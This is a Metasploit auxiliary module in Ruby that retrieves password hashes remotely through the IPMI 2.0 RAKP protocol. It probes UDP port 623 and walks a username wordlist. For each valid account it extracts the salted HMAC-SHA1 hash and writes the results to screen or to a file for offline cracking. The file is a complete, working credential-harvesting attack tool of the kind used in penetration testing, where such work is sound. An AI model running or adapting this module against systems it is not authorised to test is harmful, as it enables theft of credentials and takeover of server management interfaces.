##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##


require 'msf/core'
require 'rex/proto/ipmi'

class Metasploit3 < Msf::Auxiliary

	include Msf::Auxiliary::Report
	include Msf::Auxiliary::Scanner

	def initialize
		super(
			'Name'        => 'IPMI 2.0 RAKP Remote Password Hash Retreival',
			'Description' => 'Identify valid usernames and their hashed passwords through the IPMI 2.0 RAKP protocol',
			'Author'      => [ 'Dan Farmer <zen[at]fish2.com>', 'hdm' ],
			'License'     => MSF_LICENSE,
			'References'  => 
				[
					['URL', 'http://fish2.com/ipmi/remote-pw-cracking.html']
				],
			'DisclosureDate' => 'Jun 20 2013'
		)

		register_options(
		[
			Opt::RPORT(623),
			OptPath.new('USER_FILE', [ true, "File containing usernames, one per line",
				File.join(Msf::Config.install_root, 'data', 'wordlists', 'ipmi_users.txt')
			]),
			OptString.new('OUTPUT_FILE', [false, "File to save captured password hashes into"])
		], self.class)

	end

	def run_host(ip)

		vprint_status("Sending IPMI probes to #{ip}")

		self.udp_sock = Rex::Socket::Udp.create({'Context' => {'Msf' => framework, 'MsfExploit' => self}})
		add_socket(self.udp_sock)
		udp_send(Rex::Proto::IPMI::Utils.create_ipmi_getchannel_probe)
		r = udp_recv(5.0)

		unless r
			vprint_status("#{rhost} No response to IPMI probe")
			return
		end
		
		info = process_getchannel_reply(*r)
		unless info
			vprint_status("#{rhost} Could not understand the response to the IPMI probe")
			return
		end

		unless info.ipmi_compat_20 == 1
			vprint_status("#{rhost} Does not support IPMI 2.0")
			return
		end

		fd = ::File.open(datastore['USER_FILE'], "rb")
		fd.each_line do |line|
			username = line.strip

			console_session_id = Rex::Text.rand_text(4)
			console_random_id  = Rex::Text.rand_text(16)

			vprint_status("#{rhost} Trying username '#{username}'...")

			r = nil
			1.upto(3) do
				udp_send(Rex::Proto::IPMI::Utils.create_ipmi_session_open_request(console_session_id))
				r = udp_recv(5.0)
				break if r
			end

			unless r
				vprint_status("#{rhost} No response to IPMI open session request, stopping test")
				return
			end
			
			sess = process_opensession_reply(*r)
			unless sess
				vprint_status("#{rhost} Could not understand the response to the open session request, stopping test")
				return
			end

			r = nil
			1.upto(3) do
				udp_send(Rex::Proto::IPMI::Utils.create_ipmi_rakp_1(sess.bmc_session_id, console_random_id, username))
				r = udp_recv(5.0)
				break if r
			end

			unless r
				vprint_status("#{rhost} No response to RAKP1 message")
				next
			end
			
			rakp = process_rakp1_reply(*r)
			unless rakp
				vprint_status("#{rhost} Could not understand the response to the RAKP1 request")
				next
			end

			if rakp.error_code != 0
				vprint_status("#{rhost} Returned error code #{rakp.error_code} for username #{username}: #{Rex::Proto::IPMI::RMCP_ERRORS[rakp.error_code].to_s}")
				next
			end

			if rakp.ignored1 != 0
				vprint_status("#{rhost} Returned weird error code #{rakp.ignored1} for username #{username}")
				next
			end

			# Calculate the salt used in the hmac-sha1 hash
			hmac_buffer = Rex::Proto::IPMI::Utils.create_rakp_hmac_sha1_salt(
				console_session_id,
				sess.bmc_session_id,
				console_random_id,
				rakp.bmc_random_id,
				rakp.bmc_guid,
				0x14,
				username
			)

			found = "#{rhost} #{username}:#{hmac_buffer.unpack("H*")[0]}:#{rakp.hmac_sha1.unpack("H*")[0]}"
			print_good(found)
			if @output
				@output.write(found + "\n")
			end
		end
	end

	def process_getchannel_reply(data, shost, sport)

		shost = shost.sub(/^::ffff:/, '')

		info = Rex::Proto::IPMI::Channel_Auth_Reply.new(data) rescue nil


		# Ignore invalid responses
		return if not info
		return if not info.ipmi_command == 56

		banner = info.to_banner

		print_status("#{shost}:#{datastore['RPORT']} #{banner}")

		report_service(
			:host  => shost,
			:port  => datastore['RPORT'],
			:proto => 'udp',
			:name  => 'ipmi',
			:info  => banner
		)

		# Report a vulnerablity if info.ipmi_user_anonymous has been set
		# Report a vulnerability if ipmi 2.0 and kg is set to default
		# Report a vulnerability if info.ipmi_user_null has been set (null username)

		info
	end

	def process_opensession_reply(data, shost, sport)
		shost = shost.sub(/^::ffff:/, '')
		info = Rex::Proto::IPMI::Open_Session_Reply.new(data) rescue nil
		return if not info
		return if not info.session_payload_type == Rex::Proto::IPMI::PAYLOAD_RMCPPLUSOPEN_REP
		info
	end

	def process_rakp1_reply(data, shost, sport)
		shost = shost.sub(/^::ffff:/, '')
		info = Rex::Proto::IPMI::RAKP2.new(data) rescue nil
		return if not info
		return if not info.session_payload_type == Rex::Proto::IPMI::PAYLOAD_RAKP2
		info
	end


	#
	# Helper methods (this didn't quite fit with existing mixins)
	#

	attr_accessor :udp_sock

	def udp_send(data)
		begin
			udp_sock.sendto(data, rhost, datastore['RPORT'], 0)
		rescue ::Interrupt
			raise $!
		rescue ::Exception
		end
	end

	def udp_recv(timeo)
		r = udp_sock.recvfrom(65535, timeo)
		r[1] ? r : nil
	end

	def setup
		super
		@output = nil
		if datastore['OUTPUT_FILE']
			@output = ::File.open(datastore['OUTPUT_FILE'], "ab")
		end
	end

	def cleanup
		super
		@output.close if @output
		@output = nil
	end

	def rhost
		datastore['RHOST']
	end

	def rport
		datastore['RPORT']
	end	

end
